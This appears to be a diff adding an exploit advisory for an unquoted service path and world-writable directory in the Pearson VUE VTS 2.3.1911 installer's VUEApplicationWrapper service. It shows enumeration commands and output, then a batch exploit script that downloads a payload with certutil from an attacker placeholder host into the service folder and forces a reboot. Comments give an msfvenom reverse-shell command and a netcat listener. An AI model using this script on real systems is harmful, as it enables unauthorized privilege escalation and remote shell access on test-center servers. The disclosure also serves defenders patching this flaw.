@@ -1,0 +1,91 @@
+# Exploit Title: Pearson Vue VTS 2.3.1911 Installer - 'VUEApplicationWrapper' Unquoted Service Path
+# Discovery by: Jok3r
+# Discovery Date: 2020-09-14
+# Vendor Homepage: https://home.pearsonvue.com/
+# Software Link: https://vss.pearsonvue.com/VSSFiles/Documents/ENU_TCInstallGuide/Download_VTS_Installer.htm
+# Tested Version: 2.3.1911
+# Vulnerability Type: Unquoted Service Path
+# Tested on OS: Windows 10 Pro x64 es
+
+#Description:
+
+The Application Wrapper is the component that automates the Pearson VUE
+Testing System. The Wrapper is a scheduler that runs in the background on
+the test center’s server.
+VUEApplicationWrapper service has an unquoted service path vulnerability
+and insecure file permissions on "\Pearson VUE\" directory that allows to
+overwrite by everyone
+so that unauthorized local user can leverage privileges to VUEService user
+that has administrative rights.
+
+# Detection of unquoted service path:
+
+C:\Users\VUEService>wmic service get name, pathname, displayname, startmode
+| findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i "Pearson" |
+findstr /i /v """
+VUE Application Wrapper
+VUEApplicationWrapper C:\Pearson VUE\VUE
+Testing System\bin\VUEWrapper.exe
+Auto
+
+C:\Users\VUEService>sc qc VUEApplicationWrapper
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: VUEApplicationWrapper
+TYPE : 10 WIN32_OWN_PROCESS
+START_TYPE : 2 AUTO_START
+ERROR_CONTROL : 1 NORMAL
+BINARY_PATH_NAME : C:\Pearson VUE\VUE Testing
+System\bin\VUEWrapper.exe
+LOAD_ORDER_GROUP :
+TAG : 0
+DISPLAY_NAME : VUE Application Wrapper
+DEPENDENCIES : lanmanworkstation
+SERVICE_START_NAME : .\VUEService
+
+
+#Detection of insecure file permissions:
+
+PS C:\Users\VUEService> Get-Acl -Path "c:\Pearson Vue\"
+
+
+Directory: C:\
+
+
+Path Owner Access
+---- ----- ------
+Pearson Vue BUILTIN\Administrators Everyone Allow FullControl...
+
+
+#Exploit code:
+
+@ECHO OFF
+ECHO [+] executing command: "wmic service get
+name,pathname,displayname,startmode | findstr /i "Auto" | findstr /i
+"Pearson" | findstr /i /v "C:\Windows\\" | findstr /i /v """"
+wmic service get name,pathname,displayname,startmode | findstr /i "Auto" |
+findstr /i "Pearson" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+sc qc VUEApplicationWrapper
+powershell.exe -ep bypass -nop -c "Get-Acl -Path 'c:\Pearson Vue\'"
+ECHO [+] Enumeration was completed successfully.
+::Create VUE.exe with following commands on your kali and serve it on port
+80. Also listen port 443 with netcat for reverse shell.
+::msfvenom -p windows/x64/shell/reverse_tcp LHOST=<Your IP Address>
+LPORT=443 -f exe > VUE.exe
+ECHO [*] If you create VUE.exe under "\Pearson VUE\" directory with your
+privileges, you might be able to get VUEService user privileges after
+windows was rebooted.
+certutil -urlcache -split -f http://<YOUR_IP_ADDRESS>/VUE.exe "C:\Pearson
+VUE\VUE.exe"
+ECHO [*] Downloading VUE executable...
+PAUSE
+IF EXIST "C:\Pearson VUE\VUE.exe" (
+ECHO [+] The download was successful.
+) ELSE (
+ECHO [-] The download was unsuccessful.
+PAUSE
+)
+ECHO [!] If you continue, system will be rebooted.
+PAUSE
+shutdown /r /t 0
+::code end
